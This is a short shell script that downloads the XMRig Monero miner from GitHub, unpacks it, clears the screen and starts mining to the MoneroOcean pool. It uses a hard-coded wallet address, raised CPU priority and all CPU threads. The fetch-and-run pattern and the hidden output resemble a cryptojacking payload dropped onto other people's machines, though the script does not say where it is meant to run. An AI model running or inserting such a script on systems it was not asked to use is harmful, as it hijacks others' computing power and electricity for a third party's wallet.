#!/bin/sh
wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
cd xmrig-6.22.2
clear
chmod +x xmrig
./xmrig -a rx/0 -o gulf.moneroocean.stream:10001 -u 45MBTQ27xo1LJmAi6sNFTyZhgTdoF45XCRsLUtmL7Lo376nNuxcaSxAa3JUkUV4xHEVSpsEA6nwL5S28g1fCa1RwPfXpwnH -p Linux --cpu-priority 5 --threads $(nproc)
